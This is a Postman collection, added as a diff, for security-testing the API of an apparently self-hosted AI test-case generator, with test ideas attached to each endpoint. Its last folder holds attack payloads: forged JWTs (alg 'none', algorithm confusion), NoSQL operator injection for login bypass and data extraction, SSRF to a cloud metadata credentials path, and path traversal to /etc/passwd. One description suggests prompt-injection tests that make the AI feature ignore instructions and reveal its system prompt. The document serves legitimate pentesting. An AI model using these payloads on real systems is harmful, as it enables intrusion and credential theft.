@@ -1,0 +1,977 @@
+{
+  "info": {
+    "name": "NexTest API - Security Testing",
+    "description": "Complete API collection for security testing. All authenticated endpoints require a valid JWT token.\n\n## Setup\n1. Import this collection into Postman\n2. Set `baseUrl` collection variable (default: `http://localhost:3001`)\n3. Run **POST /api/auth/register** or **POST /api/auth/login** to get a token\n4. The `authToken` variable is auto-set from login/register responses\n\n## Security Testing Checklist\n- [ ] Rate limiting / brute force on login & register\n- [ ] SQL/NoSQL injection on all POST bodies & query params\n- [ ] JWT tampering (alter token, change alg to \"none\")\n- [ ] IDOR: try accessing other users' data by changing IDs\n- [ ] Mass assignment / privilege escalation\n- [ ] Path traversal on file upload & knowledge file DELETE\n- [ ] SSRF on SharePoint URL ingestion\n- [ ] API key leakage in responses / error messages\n- [ ] Password reset token brute force / predictability\n- [ ] File upload: malicious files (SVG with XSS, zip bombs)\n- [ ] Stream endpoint: DoS via slow reads\n- [ ] CORS misconfiguration\n- [ ] Token expiry & refresh handling",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "nextest-sec"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:3001",
+      "type": "string"
+    },
+    {
+      "key": "authToken",
+      "value": "",
+      "type": "string"
+    }
+  ],
+  "auth": {
+    "type": "bearer",
+    "bearer": [
+      {
+        "key": "token",
+        "value": "{{authToken}}",
+        "type": "string"
+      }
+    ]
+  },
+  "item": [
+    {
+      "name": "Auth (No Auth Required)",
+      "description": "These endpoints do NOT require JWT authentication. Security focus: rate limiting, injection, brute force, info disclosure.",
+      "item": [
+        {
+          "name": "POST /api/auth/register",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "    var json = pm.response.json();",
+                  "    pm.collectionVariables.set('authToken', json.token);",
+                  "    pm.collectionVariables.set('userId', json.user.id);",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"tester@example.com\",\n  \"password\": \"StrongP@ss1\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/register",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "register"]
+            },
+            "description": "Create account. Test: duplicate email, weak passwords, SQL injection, disposable email bypass, rate limiting."
+          },
+          "response": [
+            {
+              "name": "Success (201)",
+              "code": 201,
+              "body": "{\n  \"token\": \"eyJhbGciOiJIUzI1NiIs...\",\n  \"user\": {\n    \"id\": \"6655abc...\",\n    \"email\": \"tester@example.com\",\n    \"createdAt\": \"2025-01-01T00:00:00.000Z\"\n  }\n}"
+            },
+            {
+              "name": "Error (400) - Weak Password",
+              "code": 400,
+              "body": "{\n  \"error\": \"Valid email and password (min 6 characters) are required.\"\n}"
+            },
+            {
+              "name": "Error (400) - Duplicate",
+              "code": 400,
+              "body": "{\n  \"error\": \"An account with this email already exists.\"\n}"
+            },
+            {
+              "name": "Error (400) - Disposable Email",
+              "code": 400,
+              "body": "{\n  \"error\": \"Temporary email addresses are not allowed. Please use a permanent email.\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/auth/login",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "if (pm.response.code === 200) {",
+                  "    var json = pm.response.json();",
+                  "    pm.collectionVariables.set('authToken', json.token);",
+                  "    pm.collectionVariables.set('userId', json.user.id);",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"tester@example.com\",\n  \"password\": \"StrongP@ss1\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "Authenticate and get JWT. Test: brute force, timing attack (timingSafeEqual), credential stuffing, disabled account, no-rate-limiting."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"token\": \"eyJhbGciOiJIUzI1NiIs...\",\n  \"user\": {\n    \"id\": \"6655abc...\",\n    \"email\": \"tester@example.com\",\n    \"createdAt\": \"2025-01-01T00:00:00.000Z\"\n  }\n}"
+            },
+            {
+              "name": "Error (401) - Bad Credentials",
+              "code": 401,
+              "body": "{\n  \"error\": \"Invalid email or password.\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/auth/forgot-password",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"tester@example.com\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/forgot-password",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "forgot-password"]
+            },
+            "description": "Request password reset. Test: user enumeration (same response for valid/invalid), token leak in response, email injection, rate limiting."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"message\": \"Password reset link: http://localhost:3001/reset-password/<token>\",\n  \"resetLink\": \"http://localhost:3001/reset-password/<token>\",\n  \"token\": \"<reset-token>\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/auth/reset-password",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"token\": \"PASTE_RESET_TOKEN_HERE\",\n  \"password\": \"NewStrongP@ss1\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/reset-password",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "reset-password"]
+            },
+            "description": "Reset password with token. Test: expired token, already-used token, weak password, token brute force, token injection."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"message\": \"Password has been reset successfully. You can now sign in.\"\n}"
+            },
+            {
+              "name": "Error (400) - Invalid Token",
+              "code": 400,
+              "body": "{\n  \"error\": \"Unable to reset password.\"\n}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Auth (Requires JWT)",
+      "description": "These endpoints require a valid JWT token (auto-set from login/register). Security focus: JWT vulnerabilities, IDOR, privilege escalation.",
+      "item": [
+        {
+          "name": "GET /api/auth/me",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/me",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "me"]
+            },
+            "description": "Get current user profile. Test: expired token, malformed token, 'none' alg, no token, different user's token, token in URL vs header."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"user\": {\n    \"id\": \"6655abc...\",\n    \"email\": \"tester@example.com\",\n    \"createdAt\": \"2025-01-01T00:00:00.000Z\"\n  }\n}"
+            }
+          ]
+        },
+        {
+          "name": "GET /api/settings/api-keys",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/settings/api-keys",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "settings", "api-keys"]
+            },
+            "description": "List which AI providers have saved keys. Test: IDOR (no user ID in response but verify isolation), information disclosure."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"keys\": {\n    \"gemini\": true,\n    \"openai\": false,\n    \"groq\": false,\n    \"claude\": false,\n    \"openrouter\": false,\n    \"opencode\": false\n  }\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/settings/api-key",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"provider\": \"gemini\",\n  \"apiKey\": \"AIzaSyTest123456789\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/settings/api-key",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "settings", "api-key"]
+            },
+            "description": "Save encrypted API key. Test: injection in provider/apiKey, overwrite another user's key (IDOR), mass assignment, key logged in plaintext (check server logs)."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"ok\": true\n}"
+            },
+            {
+              "name": "Error (400)",
+              "code": 400,
+              "body": "{\n  \"error\": \"Provider and API key are required.\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "DELETE /api/settings/api-key",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/settings/api-key?provider=gemini",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "settings", "api-key"],
+              "query": [
+                { "key": "provider", "value": "gemini" }
+              ]
+            },
+            "description": "Delete saved API key. Test: IDOR by changing provider, delete another user's key access via the provider parameter."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"ok\": true\n}"
+            },
+            {
+              "name": "Error (400)",
+              "code": 400,
+              "body": "{\n  \"error\": \"Provider query parameter is required.\"\n}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Knowledge Base",
+      "description": "File and knowledge base management endpoints. Security focus: file upload attacks, path traversal, IDOR, SSRF.",
+      "item": [
+        {
+          "name": "GET /api/knowledge/files",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/files?search=test",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "files"],
+              "query": [
+                { "key": "search", "value": "test" }
+              ]
+            },
+            "description": "List uploaded files. Test: NoSQL injection in search param, see other users' files (IDOR), path traversal in search."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"files\": [...],\n  \"storageMode\": \"mongo\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/knowledge/upload",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "files",
+                  "type": "file",
+                  "src": "",
+                  "description": "Upload up to 12 files. Supported: .txt, .pdf, .docx, .png, .jpg, .jpeg, .gif, .webp"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/upload",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "upload"]
+            },
+            "description": "Upload files. Test: path traversal in filename, ZIP bomb, SVG with XSS, very large file (over 25MB), 13+ files, executable upload (.exe, .sh, .php), NoSQL injection in metadata."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"files\": [\n    {\n      \"_id\": \"...\",\n      \"fileName\": \"test.pdf\",\n      \"fileSize\": 12345,\n      \"mimeType\": \"application/pdf\",\n      \"createdAt\": \"...\"\n    }\n  ]\n}"
+            },
+            {
+              "name": "Error (400) - Too many files",
+              "code": 400,
+              "body": "{\n  \"error\": \"Too many files\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "DELETE /api/knowledge/files/:id",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/files/FILE_ID_HERE",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "files", "FILE_ID_HERE"]
+            },
+            "description": "Delete a file by ID. Test: IDOR (delete another user's file), invalid ObjectId, NoSQL injection in ID."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"ok\": true\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/knowledge/sharepoint",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"url\": \"https://your-tenant.sharepoint.com/sites/your-site/Docs/test.docx\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/sharepoint",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "sharepoint"]
+            },
+            "description": "Ingest document from SharePoint URL. Test: SSRF (internal URLs like 169.254.169.254, localhost, file://), SSRF to cloud metadata endpoints, SSRF to internal services."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"file\": {...}\n}"
+            },
+            {
+              "name": "Error (400)",
+              "code": 400,
+              "body": "{\n  \"error\": \"SharePoint URL is required.\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "GET /api/knowledge/search",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/search?q=test+query",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "search"],
+              "query": [
+                { "key": "q", "value": "test query" }
+              ]
+            },
+            "description": "Search knowledge chunks. Test: NoSQL injection in 'q' param, see other users' chunks (IDOR), regex DoS, very long query."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"chunks\": [\n    {\n      \"file_name\": \"test.pdf\",\n      \"chunk_text\": \"...\",\n      \"score\": 0.95\n    }\n  ]\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/knowledge/chunks/refresh",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/chunks/refresh",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "chunks", "refresh"]
+            },
+            "description": "Re-process all chunkable files into text chunks. Test: DoS by calling repeatedly, resource exhaustion."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"processed\": 5,\n  \"failed\": 0\n}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "AI Generation",
+      "description": "AI test case and script generation. Security focus: prompt injection, API key exposure, DoS, SSRF via model endpoints.",
+      "item": [
+        {
+          "name": "POST /api/generate-test-cases",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"requirement\": \"User should be able to log in with email and password\",\n  \"provider\": \"gemini\",\n  \"model\": \"gemini-2.0-flash-lite\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/generate-test-cases",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "generate-test-cases"]
+            },
+            "description": "Generate test cases (non-streaming). Test: prompt injection (ignore instructions, output system prompt), very long requirement (DoS), NoSQL injection, provider switching to steal API key, model hallucination."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"testCases\": [...],\n  \"knowledgeContext\": [...]\n}"
+            },
+            {
+              "name": "Error (400) - Short requirement",
+              "code": 400,
+              "body": "{\n  \"error\": \"Requirement text must be at least 10 characters.\"\n}"
+            },
+            {
+              "name": "Error (500) - Missing API key",
+              "code": 500,
+              "body": "{\n  \"error\": \"Missing gemini API key. Provide it in settings or env.\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/generate-test-cases/stream",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"requirement\": \"User should be able to log in with email and password\",\n  \"provider\": \"gemini\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/generate-test-cases/stream",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "generate-test-cases", "stream"]
+            },
+            "description": "SSE streaming generation. Test: slow HTTP read DoS, concurrent streams, premature connection close, SSE injection."
+          },
+          "response": [
+            {
+              "name": "SSE Stream",
+              "code": 200,
+              "body": "event: phase\ndata: {\"phase\":\"knowledge\",\"message\":\"Searching knowledge base...\"}\n\nevent: token\ndata: {\"token\":\"{\"}\n\nevent: complete\ndata: {\"testCases\":[...],\"knowledgeContext\":[...]}\n"
+            }
+          ]
+        },
+        {
+          "name": "POST /api/generate-test-scripts",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"framework\": \"playwright\",\n  \"language\": \"typescript\",\n  \"targetUrl\": \"https://example.com\",\n  \"testCases\": [\n    {\n      \"tcId\": \"TC-001\",\n      \"title\": \"Successful Login\",\n      \"priority\": \"High\",\n      \"precondition\": \"User is registered\",\n      \"steps\": [\"Navigate to /login\", \"Enter email\", \"Enter password\", \"Click Login\"],\n      \"expectedResult\": \"User is redirected to dashboard\"\n    }\n  ],\n  \"provider\": \"gemini\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/generate-test-scripts",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "generate-test-scripts"]
+            },
+            "description": "Generate automation script. Test: command injection in targetUrl/provider, code injection in testCases steps, XSS via generated script, path traversal in output."
+          },
+          "response": [
+            {
+              "name": "Success (200)",
+              "code": 200,
+              "body": "{\n  \"script\": \"import { test, expect } from '@playwright/test';...\",\n  \"framework\": \"playwright\",\n  \"language\": \"typescript\"\n}"
+            },
+            {
+              "name": "Error (400) - Missing fields",
+              "code": 400,
+              "body": "{\n  \"error\": \"framework, language, targetUrl and testCases are required.\"\n}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "User Data",
+      "description": "User profile, team, suites, history, QA results. Security focus: IDOR, mass assignment, data integrity.",
+      "item": [
+        {
+          "name": "GET /api/user/profile",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/user/profile",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "user", "profile"]
+            },
+            "description": "Load user profile. Test: IDOR (no user ID in path but verify only own data returned)."
+          }
+        },
+        {
+          "name": "POST /api/user/profile",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"displayName\": \"Security Tester\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/user/profile",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "user", "profile"]
+            },
+            "description": "Save display name. Test: XSS in displayName, mass assignment (extra fields), NoSQL injection, very long string."
+          }
+        },
+        {
+          "name": "GET /api/user/team",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/user/team",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "user", "team"]
+            },
+            "description": "Load team members. Test: IDOR, data leakage."
+          }
+        },
+        {
+          "name": "POST /api/user/team",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"members\": [\n    {\n      \"name\": \"Alice\",\n      \"email\": \"alice@example.com\",\n      \"role\": \"QA Engineer\"\n    }\n  ]\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/user/team",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "user", "team"]
+            },
+            "description": "Save team members. Test: mass assignment, XSS in name/role, add yourself to other team (IDOR if team logic exists)."
+          }
+        },
+        {
+          "name": "GET /api/user/suites",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/user/suites",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "user", "suites"]
+            },
+            "description": "Load test suites. Test: IDOR."
+          }
+        },
+        {
+          "name": "POST /api/user/suites",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"suites\": [\n    {\n      \"id\": \"suite-1\",\n      \"name\": \"Login Tests\",\n      \"status\": \"active\"\n    }\n  ]\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/user/suites",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "user", "suites"]
+            },
+            "description": "Save test suites. Test: mass assignment, circular JSON, prototype pollution."
+          }
+        },
+        {
+          "name": "GET /api/history",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/history",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "history"]
+            },
+            "description": "Load generation history. Test: IDOR, data exposure."
+          }
+        },
+        {
+          "name": "POST /api/history",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"items\": [\n    {\n      \"id\": \"hist-1\",\n      \"type\": \"test-generation\",\n      \"requirement\": \"Login feature\",\n      \"createdAt\": \"2025-01-01T00:00:00.000Z\"\n    }\n  ]\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/history",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "history"]
+            },
+            "description": "Save generation history. Test: overwrite another user's history (IDOR), unbounded array size (DoS)."
+          }
+        },
+        {
+          "name": "GET /api/qa-result",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/qa-result",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "qa-result"]
+            },
+            "description": "Load last QA result. Test: IDOR."
+          }
+        },
+        {
+          "name": "POST /api/qa-result",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"result\": {\n    \"passed\": 10,\n    \"failed\": 2,\n    \"skipped\": 1\n  }\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/qa-result",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "qa-result"]
+            },
+            "description": "Save QA result. Test: overwrite another user's result (IDOR), invalid data types."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Security Attack Payloads",
+      "description": "Common security testing payloads to use across endpoints. Copy-paste into parameter values.",
+      "item": [
+        {
+          "name": "JWT 'none' Algorithm",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjY2NTVhYmMxMjM0NTY3ODkwYWJjZGVmIiwiZW1haWwiOiJ0ZXN0ZXJAZXhhbXBsZS5jb20iLCJpYXQiOjE3MDUwMDAwMDAsImV4cCI6MTk5MDQwMDAwMH0.",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/me",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "me"]
+            },
+            "description": "Test if server accepts JWT with alg: 'none' (bypass signature verification)."
+          }
+        },
+        {
+          "name": "JWT Algorithm Confusion (RS256 -> HS256)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTVhYmMxMjM0NTY3ODkwYWJjZGVmIiwiZW1haWwiOiJ0ZXN0ZXJAZXhhbXBsZS5jb20iLCJpYXQiOjE3MDUwMDAwMDAsImV4cCI6MTk5MDQwMDAwMH0.ZHX0n9s9s0d9s0d9s0d9s0d9s0d9s0d9s0d9s0d9s0",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/me",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "me"]
+            },
+            "description": "Algorithm confusion attack - try HMAC with public key if RS is used server-side."
+          }
+        },
+        {
+          "name": "NoSQL Injection - Auth Bypass",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": { \"$gt\": \"\" },\n  \"password\": { \"$gt\": \"\" }\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/auth/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "NoSQL injection: operator injection ($gt, $ne, $regex) to bypass authentication."
+          }
+        },
+        {
+          "name": "NoSQL Injection - Data Extraction",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/search?q[$regex]=.*",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "search"],
+              "query": [
+                { "key": "q[$regex]", "value": ".*" }
+              ]
+            },
+            "description": "NoSQL injection via query parameter MongoDB operator injection."
+          }
+        },
+        {
+          "name": "SSRF - Cloud Metadata",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n}",
+              "options": { "raw": { "language": "json" } }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/sharepoint",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "sharepoint"]
+            },
+            "description": "SSRF: test if SharePoint URL can be used to hit cloud metadata endpoints (AWS, GCP, Azure)."
+          }
+        },
+        {
+          "name": "Path Traversal - File ID",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{authToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/api/knowledge/files/../../etc/passwd",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "knowledge", "files", "../../etc/passwd"]
+            },
+            "description": "Path traversal in file ID parameter. Attempt to access files outside allowed directory."
+          }
+        }
+      ]
+    }
+  ]
+}
